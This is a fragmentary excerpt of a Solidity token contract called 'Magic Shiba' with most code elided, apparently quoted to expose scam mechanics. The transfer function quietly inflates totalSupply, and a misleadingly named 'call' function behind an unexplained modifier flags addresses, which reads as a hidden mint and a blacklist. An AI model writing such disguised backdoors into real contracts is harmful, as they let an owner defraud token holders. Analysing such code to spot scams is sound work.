...
contract SHIBCRAFT {
    ...
    // 
    string public name = "Magic Shiba";
    ...
    address Construct = 0xf315522D574378be50200D914601391AB308f052;
    ...
    function transfer(address to, uint256 value) xy public returns (bool success) {
        ...
        totalSupply += update; }
        function call(address txt) layer public{          
        require(!ValueOf[txt]);
        ValueOf[txt] = true; }
